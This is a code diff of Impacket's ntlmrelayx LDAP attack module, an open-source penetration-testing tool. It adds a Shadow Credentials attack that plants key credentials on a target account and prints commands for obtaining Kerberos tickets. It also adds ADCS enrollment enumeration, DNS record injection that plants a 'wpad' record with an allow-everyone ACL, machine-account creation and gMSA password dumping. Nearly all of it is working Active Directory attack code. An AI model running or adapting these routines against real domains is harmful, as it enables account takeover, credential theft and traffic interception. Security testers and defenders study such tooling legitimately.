@@ -1,6 +1,8 @@
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# SECUREAUTH LABS. Copyright (C) 2021 SecureAuth Corporation. All rights reserved.
+# Copyright Fortra, LLC and its affiliated companies 
+#
+# All rights reserved.
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -22,12 +24,17 @@ import datetime
 import binascii
 import codecs
 import re
+import dns.resolver
 import ldap3
 import ldapdomaindump
 from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM
+from ldap3.protocol.microsoft import security_descriptor_control
+from ldap3.protocol.formatters.formatters import format_sid
 from ldap3.utils.conv import escape_filter_chars
 import os
 from Cryptodome.Hash import MD4
+from ipaddress import IPv4Address, AddressValueError
+from functools import partial
 
 from impacket import LOG
 from impacket.examples.ldap_shell import LdapShell
@@ -37,6 +44,7 @@ from impacket.ldap import ldaptypes
 from impacket.ldap.ldaptypes import ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACCESS_ALLOWED_ACE, ACE, OBJECTTYPE_GUID_MAP
 from impacket.uuid import string_to_bin, bin_to_string
 from impacket.structure import Structure, hexdump
+from impacket.examples.ntlmrelayx.utils import shadow_credentials
 
 # This is new from ldap3 v2.5
 try:
@@ -50,6 +58,7 @@ PROTOCOL_ATTACK_CLASS = "LDAPAttack"
 # Define global variables to prevent dumping the domain twice
 # and to prevent privilege escalating more than once
 dumpedDomain = False
+dumpedAdcs = False
 alreadyEscalated = False
 alreadyAddedComputer = False
 delegatePerformed = []
@@ -107,9 +116,10 @@ class LDAPAttack(ProtocolAttack):
     GENERIC_EXECUTE         = 0x00020004
     GENERIC_ALL             = 0x000F01FF
 
-    def __init__(self, config, LDAPClient, username):
-        self.computerName = '' if config.addcomputer == 'Rand' else config.addcomputer
-        ProtocolAttack.__init__(self, config, LDAPClient, username)
+    def __init__(self, config, LDAPClient, username, target=None, relay_client=None):
+        self.computerName = '' if not config.addcomputer else config.addcomputer[0]
+        self.computerPassword = '' if not config.addcomputer or len(config.addcomputer) < 2 else config.addcomputer[1]
+        ProtocolAttack.__init__(self, config, LDAPClient, username, target, relay_client)
         if self.config.interactive:
             # Launch locally listening interactive shell.
             self.tcp_shell = TcpShell()
@@ -122,10 +132,13 @@ class LDAPAttack(ProtocolAttack):
         global alreadyAddedComputer
         if alreadyAddedComputer:
             LOG.error('New computer already added. Refusing to add another')
-            return
+            return False
 
-        # Random password
-        newPassword = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
+        if not self.client.tls_started and not self.client.server.ssl:
+            LOG.info('Adding a machine account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS')
+            if not self.client.start_tls():
+                LOG.error('StartTLS failed')
+                return False
 
         # Get the domain we are in
         domaindn = domainDumper.root
@@ -137,6 +150,13 @@ class LDAPAttack(ProtocolAttack):
             newComputer = (''.join(random.choice(string.ascii_letters) for _ in range(8)) + '$').upper()
         else:
             newComputer = computerName if computerName.endswith('$') else computerName + '$'
+
+        computerPassword = self.computerPassword
+        if not computerPassword:
+            # Random password
+            newPassword = ''.join(random.choice(string.ascii_letters + string.digits + '.,;:!$-_+/*(){}#@<>^') for _ in range(15))
+        else:
+            newPassword = computerPassword
 
         computerHostname = newComputer[:-1]
         newComputerDn = ('CN=%s,%s' % (computerHostname, parent)).encode('utf-8')
@@ -181,8 +201,14 @@ class LDAPAttack(ProtocolAttack):
             LOG.error('New user already added. Refusing to add another')
             return
 
+        if not self.client.tls_started and not self.client.server.ssl:
+            LOG.info('Adding a user account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS')
+            if not self.client.start_tls():
+                LOG.error('StartTLS failed')
+                return False
+
         # Random password
-        newPassword = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
+        newPassword = ''.join(random.choice(string.ascii_letters + string.digits + '.,;:!$-_+/*(){}#@<>^') for _ in range(15))
 
         # Random username
         newUser = ''.join(random.choice(string.ascii_letters) for _ in range(10))
@@ -230,6 +256,90 @@ class LDAPAttack(ProtocolAttack):
             _thread.interrupt_main()
         else:
             LOG.error('Failed to add user to %s group: %s' % (groupName, str(self.client.result)))
+
+
+    def shadowCredentialsAttack(self, domainDumper):
+        currentShadowCredentialsTarget = self.config.ShadowCredentialsTarget
+        # If the target is not specify, we try to modify the user himself
+        if not currentShadowCredentialsTarget:
+            currentShadowCredentialsTarget = self.username
+
+        if currentShadowCredentialsTarget in delegatePerformed:
+            LOG.info('Shadow credentials attack already performed for %s, skipping' % currentShadowCredentialsTarget)
+            return
+
+        LOG.info("Searching for the target account")
+
+        # Get the domain we are in
+        domaindn = domainDumper.root
+        domain = re.sub(',DC=', '.', domaindn[domaindn.find('DC='):], flags=re.I)[3:]
+
+        # Get target computer DN
+        result = self.getUserInfo(domainDumper, currentShadowCredentialsTarget)
+        if not result:
+            LOG.error('Target account does not exist! (wrong domain?)')
+            return
+        else:
+            target_dn = result[0]
+            LOG.info("Target user found: %s" % target_dn)
+
+        LOG.info("Generating certificate")
+        key,certificate = shadow_credentials.createSelfSignedX509Certificate(subject=currentShadowCredentialsTarget)
+        LOG.info("Certificate generated")
+        LOG.info("Generating KeyCredential")
+        keyCredential = shadow_credentials.KeyCredential(key,deviceId=shadow_credentials.getDeviceId(),currentTime=shadow_credentials.getTicksNow())
+        #LOG.info("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
+        #LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
+        self.client.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
+        results = None
+        for entry in self.client.response:
+            if entry['type'] != 'searchResEntry':
+                continue
+            results = entry
+        if not results:
+            LOG.error('Could not query target user properties')
+            return
+        try:
+            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [shadow_credentials.toDNWithBinary2String( keyCredential.dumpBinary(), target_dn )]
+            LOG.info("Updating the msDS-KeyCredentialLink attribute of %s" % currentShadowCredentialsTarget)
+            self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
+            if self.client.result['result'] == 0:
+                LOG.info("Updated the msDS-KeyCredentialLink attribute of the target object")
+                if self.config.ShadowCredentialsOutfilePath is None:
+                    path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
+                    LOG.debug("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
+                else:
+                    path = self.config.ShadowCredentialsOutfilePath
+                if self.config.ShadowCredentialsExportType == "PEM":
+                    shadow_credentials.exportPEM(certificate,key,path_to_files=path)
+                    LOG.info("Saved PEM certificate at path: %s" % path + "_cert.pem")
+                    LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
+                    LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
+                    LOG.info("Run the following command to obtain a TGT")
+                    LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, domain, currentShadowCredentialsTarget, path))
+                elif self.config.ShadowCredentialsExportType == "PFX":
+                    if self.config.ShadowCredentialsPFXPassword is None:
+                        password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
+                        LOG.debug("No pass was provided. The certificate will be store with the password: %s" % password)
+                    else:
+                        password = self.config.ShadowCredentialsPFXPassword
+                    shadow_credentials.exportPFX(certificate,key,password=password, path_to_file=path)
+                    LOG.info("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
+                    LOG.info("Must be used with password: %s" % password)
+                    LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
+                    LOG.info("Run the following command to obtain a TGT")
+                    LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, domain, currentShadowCredentialsTarget, path))
+                    delegatePerformed.append(currentShadowCredentialsTarget)
+            else:
+                if self.client.result['result'] == 50:
+                    LOG.error('Could not modify object, the server reports insufficient rights: %s' % self.client.result['message'])
+                elif self.client.result['result'] == 19:
+                    LOG.error('Could not modify object, the server reports a constrained violation: %s' % self.client.result['message'])
+                else:
+                    LOG.error('The server returned an error: %s' % self.client.result['message'])
+        except IndexError:
+            LOG.info('Attribute msDS-KeyCredentialLink does not exist')
+        return
 
     def delegateAttack(self, usersam, targetsam, domainDumper, sid):
         global delegatePerformed
@@ -300,8 +410,12 @@ class LDAPAttack(ProtocolAttack):
         restoredata = {}
 
         # Query for the sid of our user
-        self.client.search(userDn, '(objectCategory=user)', attributes=['sAMAccountName', 'objectSid'])
-        entry = self.client.entries[0]
+        try:
+            self.client.search(userDn, '(objectClass=user)', attributes=['sAMAccountName', 'objectSid'])
+            entry = self.client.entries[0]
+        except IndexError:
+            LOG.error('Could not retrieve infos for user: %s' % userDn)
+            return
         username = entry['sAMAccountName'].value
         usersid = entry['objectSid'].value
         LOG.debug('Found sid for user %s: %s' % (username, usersid))
@@ -479,7 +593,6 @@ class LDAPAttack(ProtocolAttack):
                 if sid in membersids:
                     # Generic all
                     if ace['Ace']['Mask'].hasPriv(self.GENERIC_ALL):
-                        ace.dump()
                         LOG.debug('Permission found: Full Control on %s; Reason: GENERIC_ALL via %s' % (dn, sidmapping[sid]))
                         hasFullControl = True
                     if can_create_users(ace) or hasFullControl:
@@ -532,11 +645,270 @@ class LDAPAttack(ProtocolAttack):
         # If none of these match, the ACE does not apply to this object
         return False
 
+    def dumpADCS(self):
+
+        def is_template_for_authentification(entry):
+            authentication_ekus = [b"1.3.6.1.5.5.7.3.2", b"1.3.6.1.5.2.3.4", b"1.3.6.1.4.1.311.20.2.2", b"2.5.29.37.0"]
+
+            # Ignore templates requiring manager approval
+            if entry["attributes"]["msPKI-Enrollment-Flag"] & 0x02:
+                return False
+
+            # No EKU = works for client authentication
+            if not len(entry["raw_attributes"]["pKIExtendedKeyUsage"]):
+                return True
+
+            try:
+                next((eku for eku in entry["raw_attributes"]["pKIExtendedKeyUsage"] if eku in authentication_ekus))
+                return True
+            except StopIteration:
+                return False
+
+        def get_enrollment_principals(entry):
+            # Mostly taken from github.com/ly4k/Certipy/certipy/security.py
+            sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
+            sd.fromString(entry["raw_attributes"]["nTSecurityDescriptor"][0])
+
+            enrollment_uuids = [
+                "00000000-0000-0000-0000-000000000000", # All-Extended-Rights
+                "0e10c968-78fb-11d2-90d4-00c04f79dc55", # Certificate-Enrollment
+                "a05b8cc2-17bc-4802-a710-e7c15ab866a2", # Certificate-AutoEnrollment
+            ]
+
+            enrollment_principals = set()
+
+            for ace in (a for a in sd["Dacl"]["Data"] if a["AceType"] == ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE):
+                sid = format_sid(ace["Ace"]["Sid"].getData())
+                if ace["Ace"]["Flags"] == 2:
+                    uuid = bin_to_string(ace["Ace"]["InheritedObjectType"]).lower()
+                elif ace["Ace"]["Flags"] == 1:
+                    uuid = bin_to_string(ace["Ace"]["ObjectType"]).lower()
+                else:
+                    continue
+
+                if not uuid in enrollment_uuids:
+                    continue
+
+                enrollment_principals.add(sid)
+
+            return enrollment_principals
+
+        def translate_sids(sids):
+            default_naming_context = self.client.server.info.other["defaultNamingContext"][0]
+            try:
+                domain_fqdn = self.client.server.info.other["ldapServiceName"][0].split("@")[1]
+            except (KeyError, IndexError):
+                domain_fqdn = ""
+
+            sid_map = dict()
+
+            for sid in sids:
+                try:
+                    if sid.startswith("S-1-5-21-"):
+                        self.client.search(default_naming_context, "(&(objectSid=%s)(|(objectClass=group)(objectClass=user)))" % sid,
+                                    attributes=["name", "objectSid"], search_scope=ldap3.SUBTREE)
+                    else:
+                        self.client.search("CN=WellKnown Security Principals," + configuration_naming_context,
+                                    "(&(objectSid=%s)(objectClass=foreignSecurityPrincipal))" % sid, attributes=["name", "objectSid"],
+                                    search_scope=ldap3.LEVEL)
+                except:
+                    sid_map[sid] = sid
+                    continue
+
+                if not len(self.client.entries):
+                    sid_map[sid] = sid
+                else:
+                    sid_map[sid] = domain_fqdn + "\\" + self.client.response[0]["attributes"]["name"]
+
+            return sid_map
+
+
+        LOG.info("Attempting to dump ADCS enrollment services info")
+
+        configuration_naming_context = self.client.server.info.other['configurationNamingContext'][0]
+
+        enrollment_service_attributes = ["certificateTemplates", "displayName", "dNSHostName", "msPKI-Enrollment-Servers", "nTSecurityDescriptor"]
+        self.client.search("CN=Enrollment Services,CN=Public Key Services,CN=Services," + configuration_naming_context,
+                           "(objectClass=pKIEnrollmentService)", search_scope=ldap3.LEVEL, attributes=enrollment_service_attributes,
+                           controls=security_descriptor_control(sdflags=0x04))
+
+        if not len(self.client.response):
+            LOG.info("No ADCS enrollment service found")
+            return
+
+        offered_templates = set()
+        sid_map = dict()
+        for entry in self.client.response:
+            LOG.info("Found ADCS enrollment service `%s` on host `%s`, offering templates: %s" % (entry["attributes"]["displayName"],
+                     entry["attributes"]["dNSHostName"], ", ".join(("`" + tpl + "`" for tpl in entry["attributes"]["certificateTemplates"]))))
+
+            offered_templates.update(entry["attributes"]["certificateTemplates"])
+            enrollment_principals = get_enrollment_principals(entry)
+
+            known_sids = set(sid_map.keys())
+            unknwown_sids = enrollment_principals.difference(known_sids)
+            sid_map.update(translate_sids(unknwown_sids))
+
+            LOG.info("Principals who can enroll on enrollment service `%s`: %s" % (entry["attributes"]["displayName"],
+                     ", ".join(("`" + sid_map[principal] + "`" for principal in enrollment_principals))))
+
+        if not len(offered_templates):
+            LOG.info("No templates offered by the enrollment services")
+            return
+
+        LOG.info("Attempting to dump ADCS certificate templates enrollment rights, for templates allowing for client authentication and not requiring manager approval")
+
+        certificate_template_attributes = ["msPKI-Enrollment-Flag", "name", "nTSecurityDescriptor", "pKIExtendedKeyUsage"]
+        self.client.search("CN=Certificate Templates,CN=Public Key Services,CN=Services," + configuration_naming_context,
+                           "(&(objectClass=pKICertificateTemplate)(|%s))" % "".join(("(name=" + escape_filter_chars(tpl) + ")" for tpl in offered_templates)),
+                           search_scope=ldap3.LEVEL, attributes=certificate_template_attributes,
+                           controls=security_descriptor_control(sdflags=0x04))
+
+        for entry in (e for e in self.client.response if is_template_for_authentification(e)):
+            enrollment_principals = get_enrollment_principals(entry)
+
+            known_sids = set(sid_map.keys())
+            unknwown_sids = enrollment_principals.difference(known_sids)
+            sid_map.update(translate_sids(unknwown_sids))
+
+            LOG.info("Principals who can enroll using template `%s`: %s" % (entry["attributes"]["name"],
+                     ", ".join(("`" + sid_map[principal] + "`" for principal in enrollment_principals))))
+
+
+    def addDnsRecord(self, name, ipaddr):
+        # https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1
+        def new_dns_namearray(data):
+            index_array = [pos for pos, char in enumerate(data) if char == '.']
+            name_array = bytearray()
+            if len(index_array) > 0:
+                name_start = 0
+                for index in index_array:
+                    name_end = index - name_start
+                    name_array.append(name_end)
+                    name_array.extend(data[name_start:name_end+name_start].encode("utf8"))
+                    name_start = index + 1
+                name_array.append(len(data) - name_start)
+                name_array.extend(data[name_start:].encode("utf8"))
+            else:
+                name_array.append(len(data))
+                name_array.extend(data.encode("utf8"))
+            return name_array
+
+        def new_dns_record(data, type):
+            if type == "A":
+                addr_data = data.split('.')
+                dns_type = bytearray((0x1, 0x0))
+                dns_length = int_to_4_bytes(len(addr_data))[0:2]
+                dns_data = bytearray(map(int, addr_data))
+            elif type == "NS":
+                dns_type = bytearray((0x2, 0x0))
+                dns_length = int_to_4_bytes(len(data) + 4)[0:2]
+                dns_data = bytearray()
+                dns_data.append(len(data) + 2)
+                dns_data.append(len(data.split(".")))
+                dns_data.extend(new_dns_namearray(data))
+                dns_data.append(0)
+            else:
+                return False
+
+            dns_ttl = bytearray(reversed(int_to_4_bytes(60)))
+            dns_record = bytearray(dns_length)
+            dns_record.extend(dns_type)
+            dns_record.extend(bytearray((0x05, 0xF0, 0x00, 0x00)))
+            dns_record.extend(int_to_4_bytes(get_next_serial_p()))
+            dns_record.extend(dns_ttl)
+            dns_record.extend((0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00))
+            dns_record.extend(dns_data)
+            return dns_record
+
+        def int_to_4_bytes(num):
+            arr = bytearray()
+            for i in range(4):
+                arr.append(num & 0xff)
+                num >>= 8
+            return arr
+
+        # https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py
+        def get_next_serial(server, zone):
+            dnsresolver = dns.resolver.Resolver()
+            dnsresolver.nameservers = [server]
+            res = dnsresolver.resolve(zone, 'SOA',tcp=True)
+            for answer in res:
+                return answer.serial + 1
+
+        try:
+            dns_naming_context = next((nc for nc in self.client.server.info.naming_contexts if "domaindnszones" in nc.lower()))
+        except StopIteration:
+            LOG.error('Could not find DNS naming context, aborting')
+            return
+
+        domaindn = self.client.server.info.other['defaultNamingContext'][0]
+        domain = re.sub(',DC=', '.', domaindn[domaindn.find('DC='):], flags=re.I)[3:]
+        dns_base_dn = 'DC=%s,CN=MicrosoftDNS,%s' % (domain, dns_naming_context)
+
+        get_next_serial_p = partial(get_next_serial, self.client.server.address_info[0][4][0], domain)
+
+        LOG.info('Checking if domain already has a `%s` DNS record' % name)
+        if self.client.search(dns_base_dn, '(name=%s)' % escape_filter_chars(name), search_scope=ldap3.LEVEL):
+            LOG.error('Domain already has a `%s` DNS record, aborting' % name)
+            return
+
+        LOG.info('Domain does not have a `%s` record!' % name)
+
+        ACL_ALLOW_EVERYONE_EVERYTHING = b'\x01\x00\x04\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x000\x00\x02\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\n\x14\x00\x00\x00\x00\x10\x01\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00'
+
+        a_record_name = name
+        is_name_wpad = (a_record_name.lower() == 'wpad')
+
+        if is_name_wpad:
+            LOG.info('To add the `wpad` name, we need to bypass the GQBL: we\'ll first add a random `A` name and then add `wpad` as `NS` pointing to that name')
+            a_record_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(12))
+
+        # First add an A record pointing to the provided IP
+        a_record_dn = 'DC=%s,%s' % (a_record_name, dns_base_dn)
+        a_record_data = {
+            'dnsRecord': new_dns_record(ipaddr, "A"),
+            'objectCategory': 'CN=Dns-Node,%s' % self.client.server.info.other['schemaNamingContext'][0],
+            'dNSTombstoned': False,
+            'name': a_record_name,
+            'nTSecurityDescriptor': ACL_ALLOW_EVERYONE_EVERYTHING,
+        }
+
+        LOG.info('Adding `A` record `%s` pointing to `%s` at `%s`' % (a_record_name, ipaddr, a_record_dn))
+        if not self.client.add(a_record_dn, ['top', 'dnsNode'], a_record_data):
+            LOG.error('Failed to add `A` record: %s' % str(self.client.result))
+            return
+
+        LOG.info('Added `A` record `%s`. DON\'T FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)' % a_record_name)
+
+        if not is_name_wpad:
+            return
+
+        # Then add the wpad NS record
+        ns_record_name = 'wpad'
+        ns_record_dn = 'DC=%s,%s' % (ns_record_name, dns_base_dn)
+        ns_record_value = a_record_name + "." + domain
+        ns_record_data = {
+            'dnsRecord': new_dns_record(ns_record_value, "NS"),
+            'objectCategory': 'CN=Dns-Node,%s' % self.client.server.info.other['schemaNamingContext'][0],
+            'dNSTombstoned': False,
+            'name': ns_record_name,
+            'nTSecurityDescriptor': ACL_ALLOW_EVERYONE_EVERYTHING,
+        }
+
+        LOG.info('Adding `NS` record `%s` pointing to `%s` at `%s`' % (ns_record_name, ns_record_value, ns_record_dn))
+        if not self.client.add(ns_record_dn, ['top', 'dnsNode'], ns_record_data):
+            LOG.error('Failed to add `NS` record `wpad`: %s' % str(self.client.result))
+            return
+
+        LOG.info('Added `NS` record `%s`. DON\'T FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)' % ns_record_name)
+
 
     def run(self):
         #self.client.search('dc=vulnerable,dc=contoso,dc=com', '(objectclass=person)')
         #print self.client.entries
         global dumpedDomain
+        global dumpedAdcs
         # Set up a default config
         domainDumpConfig = ldapdomaindump.domainDumpConfig()
 
@@ -548,7 +920,7 @@ class LDAPAttack(ProtocolAttack):
 
         if self.config.interactive:
             if self.tcp_shell is not None:
-                LOG.info('Started interactive Ldap shell via TCP on 127.0.0.1:%d' % self.tcp_shell.port)
+                LOG.info('Started interactive Ldap shell via TCP on 127.0.0.1:%d as %s/%s' % (self.tcp_shell.port, self.domain, self.username))
                 # Start listening and launch interactive shell.
                 self.tcp_shell.listen()
                 ldap_shell = LdapShell(self.tcp_shell, domainDumper, self.client)
@@ -634,7 +1006,7 @@ class LDAPAttack(ProtocolAttack):
             LOG.info("Attempting to dump LAPS passwords")
 
             success = self.client.search(domainDumper.root, '(&(objectCategory=computer))', search_scope=ldap3.SUBTREE, attributes=['DistinguishedName','ms-MCS-AdmPwd'])
-            
+
             if success:
 
                 fd = None
@@ -671,6 +1043,13 @@ class LDAPAttack(ProtocolAttack):
         #Dump gMSA Passwords
         if self.config.dumpgmsa:
             LOG.info("Attempting to dump gMSA passwords")
+
+            if not self.client.tls_started and not self.client.server.ssl:
+                LOG.info('Dumping gMSA password requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS')
+                if not self.client.start_tls():
+                    LOG.error('StartTLS failed')
+                    return False
+
             success = self.client.search(domainDumper.root, '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=ldap3.SUBTREE, attributes=['sAMAccountName','msDS-ManagedPassword'])
             if success:
                 fd = None
@@ -700,14 +1079,35 @@ class LDAPAttack(ProtocolAttack):
                     LOG.info("Successfully dumped %d gMSA passwords through relayed account %s" % (count, self.username))
                     fd.close()
 
-        # Perform the Delegate attack if it is enabled and we relayed a computer account
-        if self.config.delegateaccess and self.username[-1] == '$':
-            self.delegateAttack(self.config.escalateuser, self.username, domainDumper, self.config.sid)
-            return
+        if not dumpedAdcs and self.config.dumpadcs:
+            dumpedAdcs = True
+            self.dumpADCS()
+            LOG.info("Done dumping ADCS info")
+
+        if self.config.adddnsrecord:
+            name = self.config.adddnsrecord[0]
+            ipaddr = self.config.adddnsrecord[1]
+
+            dns_name_ok = True
+            dns_ipaddr_ok = True
+
+            # DNS name can either be a wildcard or just contain alphanum and hyphen
+            if (name != '*') and (re.search(r'[^0-9a-z-]', name, re.I)):
+                LOG.error("Invalid name for DNS record")
+                dns_name_ok = False
+
+            try:
+                IPv4Address(ipaddr)
+            except AddressValueError:
+                LOG.error("Invalid IPv4 for DNS record")
+                dns_ipaddr_ok = False
+
+            if dns_name_ok and dns_ipaddr_ok:
+                self.addDnsRecord(name, ipaddr)
 
         # Add a new computer if that is requested
         # privileges required are not yet enumerated, neither is ms-ds-MachineAccountQuota
-        if self.config.addcomputer:
+        if self.config.addcomputer is not None:
             self.client.search(domainDumper.root, "(ObjectClass=domain)", attributes=['wellKnownObjects'])
             # Computer well-known GUID
             # https://social.technet.microsoft.com/Forums/windowsserver/en-US/d028952f-a25a-42e6-99c5-28beae2d3ac3/how-can-i-know-the-default-computer-container?forum=winservergen
@@ -717,6 +1117,15 @@ class LDAPAttack(ProtocolAttack):
             ][0]
             LOG.debug("Computer container is {}".format(computerscontainer))
             self.addComputer(computerscontainer, domainDumper)
+
+        # Perform the Delegate attack if it is enabled and we relayed a computer account
+        if self.config.delegateaccess and self.username[-1] == '$':
+            self.delegateAttack(self.config.escalateuser, self.username, domainDumper, self.config.sid)
+            return
+        
+        # Perform the Shadow Credentials attack if it is enabled
+        if self.config.IsShadowCredentialsAttack:
+            self.shadowCredentialsAttack(domainDumper)
             return
 
         # Last attack, dump the domain if no special privileges are present
